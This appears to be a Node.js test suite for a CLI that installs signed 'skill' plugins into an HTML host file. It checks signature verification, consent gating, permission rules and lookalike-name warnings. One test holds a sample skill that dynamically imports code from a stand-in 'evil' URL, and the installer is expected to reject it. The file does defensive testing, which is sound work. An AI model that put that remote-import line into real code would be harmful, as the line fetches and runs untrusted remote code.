// TDD — I11 (v0.9 open-items spec §3): `rwa install <skill.rwa-skill.json> <skill-host.html>`.
// The offline, headless counterpart of the seed's interactive install dialog. It MUST gate
// identically to the seed (signature verify + validateInstall + dynamic-import reject), require
// an explicit --yes (no dialog to consent in), splice the verified envelope into the frozen
// #rwa-skills zone deterministically (skillId-sorted), write atomically, and re-parse for
// durability. The CLI is the sole audited exception to runtime-sole-writer (Invariant 39): it
// writes the SAME zone form the seed's runtimeRegionCommit does, gated by the SAME codes.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { webcrypto } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { applySeedSubs, kindOverrides, replaceInlineDoc, extractInlineDoc } from '../src/seed.mjs';
import { signingMessage, parseSkillZone, skillId } from '../src/skill-manifest.mjs';
import { installSkillFile, buildSkillZone, installEnvelopeIntoDoc } from '../src/install.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SEED = path.join(__dirname, '..', '..', 'seeds', 'rewritable.html');
const CODE = 'async function run(i,r){return 1}';

function makeHostFile(kind = 'skill-host') {
  const ov = kindOverrides(kind);
  let html = fs.readFileSync(SEED, 'utf8');
  html = applySeedSubs(html, { uuid: webcrypto.randomUUID(), title: 'H', fileMeta: 'h.html', productKind: kind, lensPlaceholder: ov.lensPlaceholder, palPlaceholder: ov.palPlaceholder, productHeader: ov.productHeader, lensClickToAnchor: ov.lensClickToAnchor });
  html = replaceInlineDoc(html, ov.body);
  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'rwa-install-')), 'host.html');
  fs.writeFileSync(p, html);
  return p;
}
function writeEnv(envelope) {
  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'rwa-env-')), 's.rwa-skill.json');
  fs.writeFileSync(p, JSON.stringify(envelope));
  return p;
}
async function newKey() {
  const kp = await webcrypto.subtle.generateKey({ name: 'Ed25519' }, true, ['sign', 'verify']);
  const pub = Buffer.from(new Uint8Array(await webcrypto.subtle.exportKey('raw', kp.publicKey))).toString('base64');
  return { kp, pub };
}
async function signed(k, name, kind, perms, code, version = '1.0.0') {
  const manifest = { name, version, kind, permissions: perms, author_pubkey: k.pub };
  const sig = new Uint8Array(await webcrypto.subtle.sign({ name: 'Ed25519' }, k.kp.privateKey, signingMessage(manifest, code)));
  return { format: 'rwa-skill/1', skill: { ...manifest, code }, signature: Buffer.from(sig).toString('base64') };
}
const unsigned = (name, kind, perms, code) => ({ format: 'rwa-skill/1', skill: { name, version: '1.0.0', kind, permissions: perms, author_pubkey: 'AAAA', code } });
const expectExit = (fn, code, subOrErr) => assert.rejects(fn, (e) => {
  assert.equal(e.exitCode, code, `exit ${e.exitCode} ≠ ${code} (${e.subcode})`);
  if (subOrErr) assert.ok(e.subcode === subOrErr || (e.details && Array.isArray(e.details.errors) && e.details.errors.includes(subOrErr)), `${subOrErr} not in ${e.subcode}/${JSON.stringify(e.details && e.details.errors)}`);
  return true;
});

test('signed tool + consent → installs, persists to the frozen zone, re-parses verified', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const res = await installSkillFile(writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE)), host, { consent: true });
  assert.equal(res.verified, true);
  assert.equal(res.provenance, 'installed');
  const proj = parseSkillZone(extractInlineDoc(fs.readFileSync(host, 'utf8')));
  assert.ok(proj.some((p) => p.name === 'gh' && p.verified === true), 'installed skill re-parses verified');
});

test('unsigned tool is refused (unsigned_capability) and the host file is untouched', async () => {
  const host = makeHostFile();
  const before = fs.readFileSync(host, 'utf8');
  await expectExit(() => installSkillFile(writeEnv(unsigned('evil', 'tool', ['network:x.com'], CODE)), host, { consent: true }), 3, 'unsigned_capability');
  assert.equal(fs.readFileSync(host, 'utf8'), before, 'file unchanged on refusal');
});

test('--yes does NOT override a trust-gate failure (unsigned tool still exit 3)', async () => {
  const host = makeHostFile();
  await expectExit(() => installSkillFile(writeEnv(unsigned('evil', 'tool', [], CODE)), host, { consent: true }), 3, 'unsigned_capability');
});

test('compute skill declaring permissions is refused (compute_with_permissions)', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const envP = writeEnv(await signed(k, 'c', 'compute', ['network:x.com'], CODE));
  await expectExit(() => installSkillFile(envP, host, { consent: true }), 3, 'compute_with_permissions');
});

test('code using dynamic import() is hard-refused (dynamic_import_forbidden)', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const evil = await signed(k, 'loader', 'tool', ['network:api.github.com'], 'async function run(i,r){ await import("https://evil/"+1); return 1 }');
  await expectExit(() => installSkillFile(writeEnv(evil), host, { consent: true }), 3, 'dynamic_import_forbidden');
});

test('an otherwise-installable skill WITHOUT consent → exit 1 interactive_install_deferred, file untouched', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const before = fs.readFileSync(host, 'utf8');
  const envP = writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE));
  await expectExit(() => installSkillFile(envP, host, { consent: false }), 1, 'interactive_install_deferred');
  assert.equal(fs.readFileSync(host, 'utf8'), before);
});

test('wrong kind (document container) → exit 2 wrong_kind', async () => {
  const k = await newKey();
  const host = makeHostFile('document');
  const envP = writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE));
  await expectExit(() => installSkillFile(envP, host, { consent: true }), 2, 'wrong_kind');
});

test('missing envelope file → exit 2 not_found', async () => {
  const host = makeHostFile();
  await expectExit(() => installSkillFile('/no/such/envelope.json', host, { consent: true }), 2, 'not_found');
});

test('update (same key, +permission) keeps the skillId stable and surfaces the added perm', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const v1 = await installSkillFile(writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE)), host, { consent: true });
  const v2 = await installSkillFile(writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com', 'network:tracker.y'], CODE, '2.0.0')), host, { consent: true });
  assert.equal(v2.skillId, v1.skillId, 'update keeps the same skillId');
  assert.equal(v2.status, 'updated');
  assert.ok(v2.update && v2.update.added.includes('network:tracker.y'), 'the added permission is surfaced');
  const proj = parseSkillZone(extractInlineDoc(fs.readFileSync(host, 'utf8')));
  assert.equal(proj.filter((p) => p.name === 'gh').length, 1, 'still exactly one gh skill after update');
});

test('buildSkillZone is deterministic — skillId-sorted, install-order-independent', async () => {
  const k1 = await newKey(), k2 = await newKey();
  const a = await signed(k1, 'aaa', 'compute', [], CODE);
  const b = await signed(k2, 'zzz', 'compute', [], CODE);
  assert.equal(buildSkillZone([a, b]), buildSkillZone([b, a]), 'zone bytes are order-independent');
  assert.ok(/^<div data-rwa-frozen id="rwa-skills">/.test(buildSkillZone([a, b])), 'zone is the frozen div form');
});

// I11 §3 — non-blocking lookalike warning (Levenshtein ≤2 OR exact, DIFFERENT key). Mirrors the
// seed's runtimeReviewSkill lookalike scan; the trust anchor is the key, not the name.
test('a lookalike name from a DIFFERENT key warns but does NOT block install (exit 0)', async () => {
  const k1 = await newKey(), k2 = await newKey();
  const host = makeHostFile();
  await installSkillFile(writeEnv(await signed(k1, 'github-helper', 'compute', [], CODE)), host, { consent: true });
  const near = await installSkillFile(writeEnv(await signed(k2, 'github-helpr', 'compute', [], CODE)), host, { consent: true }); // distance 1, diff key
  assert.equal(near.provenance, 'installed', 'the lookalike still installs (warning is non-blocking)');
  assert.equal(near.lookalike, 'github-helper', 'the impersonated name is surfaced for the warning');
  const exact = await installSkillFile(writeEnv(await signed(k2, 'github-helper', 'compute', [], CODE)), host, { consent: true }); // exact name, diff key
  assert.equal(exact.lookalike, 'github-helper', 'an exact-name spoof from a different key is the strongest lookalike');
});

test('a same-key update does NOT false-fire as a lookalike', async () => {
  const k = await newKey();
  const host = makeHostFile();
  await installSkillFile(writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE)), host, { consent: true });
  const up = await installSkillFile(writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com', 'network:x.com'], CODE, '2.0.0')), host, { consent: true });
  assert.equal(up.lookalike, null, 'a genuine same-key update is not impersonation');
});

// locate-zone safety — only a real data-rwa-frozen #rwa-skills zone is a write target; an editable
// lookalike div is refused cleanly BEFORE any write (no stray inert block left behind).
test('a non-frozen #rwa-skills div is refused (no_skill_zone) — no stray write', () => {
  const env = { format: 'rwa-skill/1', skill: { name: 'x', version: '1.0.0', kind: 'compute', permissions: [], author_pubkey: 'AAAA', code: CODE } };
  assert.throws(() => installEnvelopeIntoDoc('<article>x</article><div id="rwa-skills"></div>', env, { consent: true }), (e) => e.exitCode === 2 && e.subcode === 'no_skill_zone');
  const ok = installEnvelopeIntoDoc('<article>x</article><div data-rwa-frozen id="rwa-skills"></div>', env, { consent: true });
  assert.equal(ok.changed, true, 'a genuine frozen zone is accepted');
});

// spec §3 acceptance gaps (regression pins over already-correct behavior).
test('re-installing the identical envelope is a no-op (already_installed, file unchanged)', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const envP = writeEnv(await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE));
  await installSkillFile(envP, host, { consent: true });
  const after1 = fs.readFileSync(host, 'utf8');
  const r2 = await installSkillFile(envP, host, { consent: true });
  assert.equal(r2.status, 'already_installed');
  assert.equal(fs.readFileSync(host, 'utf8'), after1, 'an idempotent re-install does not rewrite the file');
});

test('a tampered signature is refused (exit 3) and the host file is untouched', async () => {
  const k = await newKey();
  const host = makeHostFile();
  const env = await signed(k, 'gh', 'tool', ['network:api.github.com'], CODE);
  env.signature = (env.signature[0] === 'A' ? 'B' : 'A') + env.signature.slice(1); // flip one base64 char
  const before = fs.readFileSync(host, 'utf8');
  const envP = writeEnv(env);
  await expectExit(() => installSkillFile(envP, host, { consent: true }), 3, 'unsigned_capability');
  assert.equal(fs.readFileSync(host, 'utf8'), before);
});

test('a compute UPDATE that adds permissions is refused (compute_with_permissions)', async () => {
  const k = await newKey();
  const host = makeHostFile();
  await installSkillFile(writeEnv(await signed(k, 'c', 'compute', [], CODE)), host, { consent: true });
  const envP = writeEnv(await signed(k, 'c', 'compute', ['network:x.com'], CODE, '2.0.0'));
  await expectExit(() => installSkillFile(envP, host, { consent: true }), 3, 'compute_with_permissions');
});

test('a malformed envelope JSON is refused (exit 3 invalid_json)', async () => {
  const host = makeHostFile();
  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'rwa-env-')), 'bad.json');
  fs.writeFileSync(p, '{ not valid json');
  await expectExit(() => installSkillFile(p, host, { consent: true }), 3, 'invalid_json');
});
